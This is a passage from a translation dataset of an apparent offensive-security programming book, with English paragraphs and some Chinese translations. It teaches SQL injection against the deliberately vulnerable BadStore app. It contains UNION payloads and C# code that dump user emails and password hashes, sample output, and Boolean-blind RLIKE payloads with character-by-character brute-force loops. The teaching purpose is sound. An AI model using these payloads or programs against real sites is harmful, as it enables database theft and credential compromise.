    to look for any data brought back from a SQL injection exploit. It can be difficult
    to programmatically detect where the attacker-controlled data is in the server
    response. To make this easier, we can use the CONCAT SQL function to surround
    the data we actually care about with known markers, as in [Listing 2-31](#filepos195801).
  id: totrans-441
  prefs: []
  type: TYPE_NORMAL
- en: searchquery=fdsa'+UNION+ALL+SELECT+NULL, NULL, CONCAT(0x71766a7a71,'hacked',0x716b626b71),
    NULL#
  id: totrans-442
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-31: Sample payload for the  searchquery  parameter that returns the
    word  hacked'
  id: totrans-443
  prefs: []
  type: TYPE_NORMAL
- en: The payload in [Listing 2-31](#filepos195801) uses hexadecimal values to add
    data to the left and right of the extra value hacked we select with our payload.
    If the payload is echoed back in the HTML from the web application, a regular
    expression won’t accidentally match the original payload. In this example, 0x71766a7a71
    is qvjzq and 0x716b626b71 is qkbkq. If the injection works, the response should
    contain qvjzqhackedqkbkq. If the injection doesn’t work, and the search results
    are echoed back as is, a regular expression such as qvjzq(.*)qkbkq would not match
    the hexadecimal values in the original payload. The MySQL CONCAT() function is
    a handy way to ensure that our exploit will grab the correct data from the web
    server response.
  id: totrans-444
  prefs: []
  type: TYPE_NORMAL
- en: '[Listing 2-32](#filepos197468) shows a more useful example. Here, we can replace
    the CONCAT() function from the previous payload to return the current database,
    surrounded by the known left and right markers.'
  id: totrans-445
  prefs: []
  type: TYPE_NORMAL
- en: 'CONCAT(0x7176627a71, DATABASE(), 0x71766b7671) Listing 2-32: Sample payload
    that returns the current database name'
  id: totrans-446
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: The result of the injection on the BadStore search function should be qvbzqbadstoredbqvkvq.
    A regular expression such as qvbzq(.*)qvkvq should return the value of badstoredb,
    the name of the current database.
  id: totrans-447
  prefs: []
  type: TYPE_NORMAL
- en: Now that we know how to efficiently get the values out of the database, we can
    begin siphoning data out of the current database using the UNION injection. One
    particularly useful table in most web applications is the users table. As you
    can see in [Listing 2-33](#filepos198750), we can easily use the UNION injection
    technique described earlier to enumerate the users and their password hashes from
    the users table (called userdb) with a single request and payload.
  id: totrans-448
  prefs: []
  type: TYPE_NORMAL
- en: searchquery=fdas'+UNION+ALL+SELECT+NULL, NULL, CONCAT(0x716b717671, email,
  id: totrans-449
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 0x776872786573, passwd,0x71767a7a71), NULL+FROM+badstoredb.userdb#
  id: totrans-450
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-33: This payload pulls the emails and passwords from the BadStore
    database separated by left, middle, and right markers.'
  id: totrans-451
  prefs: []
  type: TYPE_NORMAL
- en: The results should show up on the web page in the item table if the injection
    is successful.
  id: totrans-452
  prefs: []
  type: TYPE_NORMAL
- en: Performing a UNION-Based Exploit Programmatically
  id: totrans-453
  prefs: []
  type: TYPE_NORMAL
- en: Now let’s look at how we can perform this exploit programmatically using some
    C# and the HTTP classes. By putting the payload shown in [Listing 2-33](#filepos198750)
    in the searchquery parameter, we should see an item table in the web page with
    usernames and password hashes instead of any real items. All we need to do is
    make a single HTTP request and then use a regular expression to pull the emails
    and password hashes between the markers from the HTTP server’s response.
  id: totrans-454
  prefs: []
  type: TYPE_NORMAL
- en: Creating the Markers to Find the Usernames and Passwords
  id: totrans-455
  prefs: []
  type: TYPE_NORMAL
- en: First, we need to create the markers for the regular expression, as shown in
    [Listing 2-34](#filepos201007). These markers will be used to delineate the values
    brought back from the database during the SQL injection. We want to use random-looking
    strings not likely to be found in the HTML source code so that our regular expression
    will only grab the usernames and password hashes we want from the HTML returned
    in the HTTP response.
  id: totrans-456
  prefs: []
  type: TYPE_NORMAL
- en: string frontMarker = ➊"FrOnTMaRker";
  id: totrans-457
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string middleMarker = ➋"mIdDlEMaRker";
  id: totrans-458
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string endMarker = ➌"eNdMaRker";
  id: totrans-459
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string frontHex = string.➍Join("", frontMarker.➎Select(c => ((int)c).ToString("X2")));
  id: totrans-460
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string middleHex = string.Join("", middleMarker.Select(c => ((int)c).ToString("X2")));
  id: totrans-461
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'string endHex = string.Join("", endMarker.Select(c => ((int)c).ToString("X2")));
    Listing 2-34: Creating the markers to be used in the  UNION-based SQL injection
    payload'
  id: totrans-462
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: To start things off, we create three strings to be used as the front ➊, middle
    ➋, and end ➌ markers. These will be used to find and separate the usernames and
    passwords we pulled from the database in the HTTP response. We also need to create
    the hexadecimal representations of the markers that will go in the payload. To
    do this, each marker needs to be processed a little bit.
  id: totrans-463
  prefs: []
  type: TYPE_NORMAL
- en: We use the LINQ method Select() ➎ to iterate over each character in the marker
    string, convert each character into its hexadecimal representation, and return
    an array of the data processed. In this case, it returns an array of 2-byte strings,
    each of which is the hexadecimal representation of a character in the original
    marker.
  id: totrans-464
  prefs: []
  type: TYPE_NORMAL
- en: In order to create a full hexadecimal string from this array, we use the Join()
    method ➍ to join each element in the array, creating a hexadecimal string representing
    each marker.
  id: totrans-465
  prefs: []
  type: TYPE_NORMAL
- en: Building the URL with the Payload
  id: totrans-466
  prefs: []
  type: TYPE_NORMAL
- en: Now we need to build the URL and the payload to make the HTTP request, as shown
    in [Listing 2-35](#filepos203227).
  id: totrans-467
  prefs: []
  type: TYPE_NORMAL
- en: string url = ➊"http://" + ➋args[0] + "/cgi-bin/badstore.cgi";
  id: totrans-468
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-469
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string payload = "fdsa' UNION ALL SELECT";
  id: totrans-470
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: payload += " NULL, NULL, NULL, CONCAT(0x"+frontHex+", IFNULL(CAST(email AS";
  id: totrans-471
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: payload += " CHAR), 0x20),0x"+middleHex+", IFNULL(CAST(passwd AS";
  id: totrans-472
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: payload += " CHAR), 0x20), 0x"+endHex+") FROM badstoredb.userdb# ";
  id: totrans-473
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-474
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'url += ➌"?searchquery=" + Uri.➍EscapeUriString(payload) + "&action=search";
    Listing 2-35: Building the URL with the payload in the  Main()  method of the
    exploit'
  id: totrans-475
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'url += ➌"?searchquery=" + Uri.➍EscapeUriString(payload) + "&action=search";
    列表 2-35: 在漏洞利用的 Main() 方法中构建带有载荷的 URL'
- en: 'We create the URL ➊ to make the request using the first argument ➋ passed to
    the exploit: an IP address of the BadStore instance. Once the base URL is created,
    we create the payload to be used to return the usernames and password hashes from
    the database, including the three hexadecimal strings we made of the markers to
    separate the usernames from the passwords. As stated earlier, we encode the markers
    in hexadecimal to ensure that, in case the markers are echoed back without the
    data we want, our regular expression won’t accidentally match them and return
    junk data. Finally, we combine the payload and the URL ➌ by appending the vulnerable
    query string parameters with the payload on the base URL. To ensure that the payload
    doesn’t contain any characters unique to the HTTP protocol, we pass the payload
    to EscapeUriString() ➍ before inserting it into the query string.'
  id: totrans-476
  prefs: []
  type: TYPE_NORMAL
  zh: 我们创建了 URL ➊ 来发起请求，使用了漏洞利用的第一个参数 ➋：BadStore 实例的 IP 地址。一旦创建了基本的 URL，我们就构建了一个载荷，用来从数据库中返回用户名和密码哈希，其中包括我们用来分隔用户名和密码的三个十六进制字符串。正如前面所述，我们将标记编码为十六进制，以确保在标记被回显而没有我们想要的数据时，我们的正则表达式不会错误地匹配它们并返回垃圾数据。最后，我们通过将易受攻击的查询字符串参数与载荷附加到基本
    URL 上，来组合载荷和 URL ➌。为了确保载荷不包含任何 HTTP 协议特有的字符，我们将载荷传递给 EscapeUriString() ➍，然后再将其插入查询字符串中。
- en: Making the HTTP Request
  id: totrans-477
  prefs: []
  type: TYPE_NORMAL
  zh: 发起 HTTP 请求
- en: We are now ready to make the request and receive the HTTP response containing
    the usernames and password hashes that were pulled from the database with the
    SQL injection payload (see [Listing 2-36](#filepos205180)).
  id: totrans-478
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在准备好发起请求并接收包含从数据库中提取的用户名和密码哈希的 HTTP 响应，数据是通过 SQL 注入载荷获得的（见 [列表 2-36](#filepos205180)）。
- en: HttpWebRequest request = (HttpWebRequest)WebRequest.➊Create(url);
  id: totrans-479
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: HttpWebRequest request = (HttpWebRequest)WebRequest.➊Create(url);
- en: string response = string.Empty;
  id: totrans-480
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string response = string.Empty;
- en: using (StreamReader reader = ➋new StreamReader(request.GetResponse().GetResponseStream()))
  id: totrans-481
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (StreamReader reader = ➋new StreamReader(request.GetResponse().GetResponseStream()))
- en: 'response = reader.➌ReadToEnd(); Listing 2-36: Creating the HTTP request and
    reading the response from the server'
  id: totrans-482
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'response = reader.➌ReadToEnd(); 列表 2-36: 创建 HTTP 请求并读取服务器的响应'
- en: We create a basic GET request by creating a new HttpWebRequest ➊ with the URL
    we built previously containing the SQL injection payload. We then declare a string
    to hold our response, assigning it an empty string by default. Within the context
    of a using statement, we instantiate a StreamReader ➋ and read the response ➌
    into our response string. Now that we have the response from the server, we can
    create a regular expression using our markers to find the usernames and passwords
    within the HTTP response, as [Listing 2-37](#filepos206637) shows.
  id: totrans-483
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过创建一个新的 HttpWebRequest ➊，并使用我们之前构建的包含 SQL 注入载荷的 URL，来创建一个基本的 GET 请求。然后我们声明一个字符串来保存响应，默认将其赋为空字符串。在使用语句的上下文中，我们实例化一个
    StreamReader ➋ 并将响应 ➌ 读取到我们的响应字符串中。现在我们已经获得了服务器的响应，我们可以使用我们的标记创建一个正则表达式，按照 [列表
    2-37](#filepos206637) 的示例，在 HTTP 响应中查找用户名和密码。
- en: Regex payloadRegex = ➊new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)"
    + endMarker);
  id: totrans-484
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Regex payloadRegex = ➊new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)"
    + endMarker);
- en: MatchCollection matches = payloadRegex.➋Matches(response);
  id: totrans-485
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: MatchCollection matches = payloadRegex.➋Matches(response);
- en: foreach (Match match in matches)
  id: totrans-486
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: foreach (Match match in matches)
- en: '{'
  id: totrans-487
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: 'Console.➌WriteLine("Username: " + match.➍Groups [1].Value + "\t ");'
  id: totrans-488
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Console.➌WriteLine("用户名: " + match.➍Groups[1].Value + "\t ");'
- en: 'Console.Write("Password hash: " + match.➎Groups[2].Value);'
  id: totrans-489
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Console.Write("密码哈希: " + match.➎Groups[2].Value);'
- en: '}'
  id: totrans-490
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-491
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-37: Matching the server response against the regular expression to
    pull out database values'
  id: totrans-492
  prefs: []
  type: TYPE_NORMAL
  zh: '列表 2-37: 使用正则表达式匹配服务器响应，以提取数据库值'
- en: Here, we find and print the values retrieved with the SQL injection from the
    HTTP response. We first use the Regex class ➊ (in the namespace System.Text.RegularExpressions)
    to create a regular expression. This regular expression contains two expression
    groups that capture the username and password hash from a match, using the front,
    middle, and end markers defined previously. We then call the Matches() method
    ➋ on the regular expression, passing the response data as an argument to Matches().
    The Matches() method returns a MatchCollection object, which we can iterate over
    using a foreach loop to retrieve each string in the response that matches the
    regular expression created earlier using our markers.
  id: totrans-493
  prefs: []
  type: TYPE_NORMAL
- en: As we iterate over each expression match, we print the username and password
    hash. Using the WriteLine() method ➌ to print the values, we build a string using
    the expression group captures for the usernames ➍ and the passwords ➎, which are
    stored the Groups property of the expression match.
  id: totrans-494
  prefs: []
  type: TYPE_NORMAL
- en: Running the exploit should result in the printout shown in [Listing 2-38](#filepos208925).
  id: totrans-495
  prefs: []
  type: TYPE_NORMAL
- en: 'Username: AAA_Test_User Password hash: 098F6BCD4621D373CADE4E832627B4F6'
  id: totrans-496
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Username: admin Password hash: 5EBE2294ECD0E0F08EAB7690D2A6EE69'
  id: totrans-497
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Username: joe@supplier.com Password hash: 62072d95acb588c7ee9d6fa0c6c85155'
  id: totrans-498
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Username: big@spender.com Password hash: 9726255eec083aa56dc0449a21b33190'
  id: totrans-499
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: --snip--
  id: totrans-500
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Username: tommy@customer.net Password hash: 7f43c1e438dc11a93d19616549d4b701'
  id: totrans-501
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-38: Sample output from the  UNION-based exploit'
  id: totrans-502
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, with a single request we were able to extract all the usernames
    and password hashes from the userdb table in the BadStore MySQL database using
    a UNION SQL injection.
  id: totrans-503
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting Boolean-Blind SQL Vulnerabilities
  id: totrans-504
  prefs: []
  type: TYPE_NORMAL
- en: A blind SQL injection, also known as a Boolean-based blind SQL injection, is
    one in which an attacker doesn’t get direct information from a database but can
    extract information indirectly from the database, generally 1 byte at a time,
    by asking true-or-false questions.
  id: totrans-505
  prefs: []
  type: TYPE_NORMAL
- en: How Blind SQL Injections Work
  id: totrans-506
  prefs: []
  type: TYPE_NORMAL
- en: Blind SQL injections require a bit more code than UNION exploits in order to
    efficiently exploit a SQL injection vulnerability, and they take much more time
    to complete because so many HTTP requests are required. They are also far noisier
    on the server’s side than something like the UNION exploit and may leave much
    more evidence in logs.
  id: totrans-507
  prefs: []
  type: TYPE_NORMAL
- en: When performing a blind SQL injection, you get no direct feedback from the web
    application; you rely instead on metadata, such as behavior changes, in order
    to glean information from a database. For instance, by using the RLIKE MySQL keyword
    to match values in the database with a regular expression, as shown in [Listing
    2-39](#filepos210960), we can cause an error to display in BadStore.
  id: totrans-508
  prefs: []
  type: TYPE_NORMAL
- en: searchquery=fdsa'+RLIKE+0x28+AND+'
  id: totrans-509
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-39: Sample  RLIKE  blind SQL injection payload that causes an error
    in BadStore'
  id: totrans-510
  prefs: []
  type: TYPE_NORMAL
- en: When passed to BadStore, RLIKE will attempt to parse the hexadecimal-encoded
    string as a regular expression, causing an error (see [Listing 2-40](#filepos212067))
    because the string passed is a special character in regular expressions. The open
    parenthesis [ ( ] character (0x28 in hexadecimal) denotes the beginning of an
    expression group, which we also used to match usernames and password hashes in
    the UNION exploit. The open parenthesis character must have a corresponding close
    parenthesis [ ) ] character; otherwise, the syntax for the regular expression
    will be invalid.
  id: totrans-511
  prefs: []
  type: TYPE_NORMAL
  zh: 当传递给BadStore时，RLIKE将尝试将十六进制编码的字符串作为正则表达式进行解析，导致错误（见[清单2-40](#filepos212067)），因为传入的字符串在正则表达式中是一个特殊字符。开括号[
    ( ]字符（0x28的十六进制值）表示表达式组的开始，我们也使用它来匹配用户名和密码哈希值的联合利用。开括号字符必须有一个对应的闭括号[ ) ]字符，否则正则表达式的语法将无效。
- en: 'Got error ''parentheses not balanced'' from regexp Listing 2-40: Error from  RLIKE  when
    an invalid regular expression is passed in'
  id: totrans-512
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 从正则表达式清单2-40中获得错误“括号不匹配”：当传入无效的正则表达式时，RLIKE产生错误
- en: The parentheses are not balanced because a close parenthesis is missing. Now
    we know that we can reliably control the behavior of BadStore using true and false
    SQL queries to cause it to error.
  id: totrans-513
  prefs: []
  type: TYPE_NORMAL
  zh: 括号不匹配，因为缺少一个闭括号。现在我们知道，可以通过使用真假SQL查询可靠地控制BadStore的行为，从而导致其出错。
- en: Using RLIKE to Create True and False Responses
  id: totrans-514
  prefs: []
  type: TYPE_NORMAL
  zh: 使用RLIKE创建真假响应
- en: We can use a CASE statement in MySQL (which behaves like a case statement in
    C-like languages) to deterministically select a good or bad regular expression
    for RLIKE to parse. For example, [Listing 2-41](#filepos213169) returns a true
    response.
  id: totrans-515
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以在MySQL中使用CASE语句（它的行为类似于C语言中的case语句）来确定性地选择RLIKE解析的好或坏的正则表达式。例如，[清单2-41](#filepos213169)返回正确的响应。
- en: searchquery=fdsa'+RLIKE+(SELECT+(CASE+WHEN+(1=1➊)+THEN+0x28+ELSE+0x41+END))+AND+'
  id: totrans-516
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: searchquery=fdsa'+RLIKE+(SELECT+(CASE+WHEN+(1=1➊)+THEN+0x28+ELSE+0x41+END))+AND+'
- en: 'Listing 2-41: An  RLIKE  blind payload that should return a true response'
  id: totrans-517
  prefs: []
  type: TYPE_NORMAL
  zh: 清单2-41：一个RLIKE盲注负载，应该返回正确的响应
- en: The CASE statement first determines whether 1=1 ➊ is true. Because this equation
    is true, 0x28 is returned as the regular expression that RLIKE will try to parse,
    but because ( is not a valid regular expression, an error should be thrown by
    the web application. If we manipulate the CASE criteria of 1=1 (which evaluates
    to true) to be 1=2, the web application no longer throws an error. Because 1=2
    evaluates to false, 0x41 (an uppercase A in hexadecimal) is returned to be parsed
    by RLIKE and does not cause a parsing error.
  id: totrans-518
  prefs: []
  type: TYPE_NORMAL
  zh: CASE语句首先判断1=1 ➊是否为真。由于这个等式成立，RLIKE会尝试解析0x28作为正则表达式，但因为(不是一个有效的正则表达式，应该会抛出错误。如果我们将CASE条件1=1（其结果为真）改为1=2，Web应用程序不再抛出错误。因为1=2的结果为假，RLIKE会返回0x41（十六进制的大写字母A）供解析，不会引发解析错误。
- en: By asking true-or-false questions (does this equal that?) of the web application,
    we can determine how it behaves and then, based on that behavior, determine whether
    the answer to our question was true or false.
  id: totrans-519
  prefs: []
  type: TYPE_NORMAL
  zh: 通过向Web应用程序提出真假问题（这个等于那个吗？），我们可以确定它的行为，然后根据该行为来判断我们的问题的答案是真还是假。
- en: Using the RLIKE Keyword to Match Search Criteria
  id: totrans-520
  prefs: []
  type: TYPE_NORMAL
  zh: 使用RLIKE关键字来匹配搜索条件
- en: The payload in [Listing 2-42](#filepos215187) for the searchquery parameter
    should return a true response (an error) because the length of the number of rows
    in the userdb table is greater than 1.
  id: totrans-521
  prefs: []
  type: TYPE_NORMAL
  zh: 清单2-42中的负载（针对searchquery参数）应该返回正确的响应（一个错误），因为userdb表中行数的长度大于1。
- en: searchquery=fdsa'+RLIKE+(SELECT+(CASE+WHEN+((SELECT+LENGTH(IFNULL(CAST(COUNT(*)
  id: totrans-522
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: searchquery=fdsa'+RLIKE+(SELECT+(CASE+WHEN+((SELECT+LENGTH(IFNULL(CAST(COUNT(*)
- en: +AS+CHAR),0x20))+FROM+userdb)=1➊)+THEN+0x41+ELSE+0x28+END))+AND+'
  id: totrans-523
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: +AS+CHAR),0x20))+FROM+userdb)=1➊)+THEN+0x41+ELSE+0x28+END))+AND+'
- en: 'Listing 2-42: Sample Boolean-based SQL injection payload for the  searchquery  parameter'
  id: totrans-524
  prefs: []
  type: TYPE_NORMAL
  zh: 清单2-42：用于searchquery参数的布尔型SQL注入负载示例
- en: Using the RLIKE and CASE statements, we check whether the length of the count
    of the BadStore userdb is equal to 1\. The COUNT(*) statement returns an integer,
    which is the number of rows in a table. We can use this number to significantly
    reduce the number of requests needed to finish an attack.
  id: totrans-525
  prefs: []
  type: TYPE_NORMAL
  zh: 使用RLIKE和CASE语句，我们检查BadStore的userdb表的行数是否等于1。COUNT(*)语句返回一个整数，即表中的行数。我们可以利用这个数字显著减少完成攻击所需的请求次数。
- en: If we modify the payload to determine whether the length of the number of rows
    is equal to 2 instead of 1 ➊, the server should return a true response that contains
    an error that says “parentheses not balanced.” For example, say BadStore has 999
    users in the userdb table. Although you might expect that we’d need to send at
    least 1,000 requests to determine whether the number returned by COUNT(*) was
    greater than 999, we can brute-force each individual digit (each instance of 9)
    much faster than we could the whole number (999). The length of the number 999
    is three, since 999 is three characters long. If, instead of brute-forcing the
    whole number 999, we brute-force the first, second, and then third digits individually,
    we would have the whole number 999 brute-forced in just 30 requests—up to 10 requests
    per single number.
  id: totrans-526
  prefs: []
  type: TYPE_NORMAL
- en: Determining and Printing the Number of Rows in the userdb Table
  id: totrans-527
  prefs: []
  type: TYPE_NORMAL
- en: To make this a bit more clear, let’s write a Main() method to determine how
    many rows are contained in the userdb table. With the for loop shown in [Listing
    2-43](#filepos218157), we determine the length of the number of rows contained
    in the userdb table.
  id: totrans-528
  prefs: []
  type: TYPE_NORMAL
- en: int countLength = 1;
  id: totrans-529
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: for (;;countLength++)
  id: totrans-530
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-531
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
  id: totrans-532
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getCountLength += " LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM";
  id: totrans-533
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getCountLength += " userdb)="+countLength+") THEN 0x28 ELSE 0x41 END))";
  id: totrans-534
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getCountLength += " AND 'LeSo'='LeSo";
  id: totrans-535
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-536
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string response = MakeRequest(getCountLength);
  id: totrans-537
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (response.Contains("parentheses not balanced"))
  id: totrans-538
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: break;
  id: totrans-539
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-540
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-43: The  for  loop retrieving the length of the database count of
    the user database'
  id: totrans-541
  prefs: []
  type: TYPE_NORMAL
- en: We begin with a countLength of zero and then increment countLength by 1 each
    time through the loop, checking whether the response to the request contains the
    true string "parentheses not balanced". If so, we break out of the for loop with
    the correct countLength, which should be 23.
  id: totrans-542
  prefs: []
  type: TYPE_NORMAL
- en: Then we ask the server for the number of rows contained in the userdb table,
    as shown in [Listing 2-44](#filepos220108).
  id: totrans-543
  prefs: []
  type: TYPE_NORMAL
- en: List<byte> countBytes = new List<byte>();
  id: totrans-544
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: for (int i = 1; i <= countLength; i++)
  id: totrans-545
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-546
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: for (int c = 48; c <= 58; c++)
  id: totrans-547
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-548
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (➊ORD(➋MID((SELECT";
  id: totrans-549
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getCount += " IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb)➌,";
  id: totrans-550
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getCount += i➍+ ", 1➎))="+c➏+") THEN 0x28 ELSE 0x41 END)) AND '";
  id: totrans-551
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string response = MakeRequest (getCount);
  id: totrans-552
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-553
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (response.➐Contains("parentheses not balanced"))
  id: totrans-554
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-555
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: countBytes.➑Add((byte)c);
  id: totrans-556
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: break;
  id: totrans-557
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-558
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-559
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-560
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-44: Retrieving the number of rows in the  userdb  table'
  id: totrans-561
  prefs: []
  type: TYPE_NORMAL
- en: The SQL payload used in [Listing 2-44](#filepos220108) is a bit different from
    the previous SQL payloads used to retrieve the count. We use the ORD() ➊ and MID()
    ➋ SQL functions.
  id: totrans-562
  prefs: []
  type: TYPE_NORMAL
- en: The ORD() function converts a given input into an integer, and the MID() function
    returns a particular substring, based on a starting index and length to return.
    By using both functions, we can select one character at a time from a string returned
    by a SELECT statement and convert it to an integer. This allows us to compare
    the integer representation of the byte in the string to to the character value
    we are testing for in the current interation.
  id: totrans-563
  prefs: []
  type: TYPE_NORMAL
- en: 'The MID() function takes three arguments: the string you are selecting a substring
    from ➌; the starting index (which is 1 based, not 0 based, as you might expect)
    ➍; and the length of the substring to select ➎. Notice that the second argument
    ➍ to MID() is dictated by the current iteration of the outermost for loop, where
    we increment i up to the count length determined in the previous for loop. This
    argument selects the next character in the string to test as we iterate and increment
    it. The inner for loop iterates over the integer equivalents of the ASCII characters
    0 through 9\. Because we’re only attempting to get the row count in the database,
    we only care about numerical characters.'
  id: totrans-564
  prefs: []
  type: TYPE_NORMAL
- en: Both the i ➍ and c ➏ variables are used in the SQL payload during the Boolean
    injection attack. The variable i is used as the second argument in the MID() function,
    dictating the character position in the database value we will test. The variable
    c is the integer we are comparing the result of ORD() to, which converts the character
    returned by MID() to an integer. This allows us to iterate over each character
    in a given value in the database and brute-force the character using true-or-false
    questions.
  id: totrans-565
  prefs: []
  type: TYPE_NORMAL
- en: When the payload returns the error "parentheses not balanced" ➐, we know that
    the character at index i equals the integer c of the inner loop. We then cast
    c to a byte and add it to a List<byte> ➑ instantiated before looping. Finally,
    we break out of the inner loop to iterate through the outer loop and, once the
    for loops have completed, we convert the List<byte> into a printable string.
  id: totrans-566
  prefs: []
  type: TYPE_NORMAL
- en: This string is then printed to the screen, as shown in [Listing 2-45](#filepos223808).
  id: totrans-567
  prefs: []
  type: TYPE_NORMAL
- en: int count = int.Parse(Encoding.ASCII.➊GetString(countBytes.ToArray()));
  id: totrans-568
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Console.WriteLine("There are "+count+" rows in the userdb table"); Listing
    2-45: Converting the string retrieved by the SQL injection and printing the number
    of rows in the table'
  id: totrans-569
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: We use the GetString() method ➊ (from the Encoding.ASCII class) to convert the
    array of bytes returned by countBytes.ToArray() into a human-readable string.
    This string is then passed to int.Parse(), which parses it and returns an integer
    (if the string can be converted to an integer). The string is then printed using
    Console.WriteLine().
  id: totrans-570
  prefs: []
  type: TYPE_NORMAL
- en: The MakeRequest() Method
  id: totrans-571
  prefs: []
  type: TYPE_NORMAL
- en: 'We’re just about ready to run our exploit, save for one more thing: we need
    a way to send payloads within the for loops. To do so, we need to write the MakeRequest()
    method, which takes a single argument: the payload to send (see [Listing 2-46](#filepos225672)).'
  id: totrans-572
  prefs: []
  type: TYPE_NORMAL
- en: private static string MakeRequest(string payload)
  id: totrans-573
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-574
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string url = ➊"http://192.168.1.78/cgi-bin/badstore.cgi?action=search&searchquery=";
  id: totrans-575
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: HttpWebRequest request = (HttpWebRequest)WebRequest.➋Create(url+payload);
  id: totrans-576
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-577
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string response = string.Empty;
  id: totrans-578
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: using (StreamReader reader = new ➌StreamReader(request.GetResponse().GetResponseStream()))
  id: totrans-579
  prefs:
  - PREF_BQ
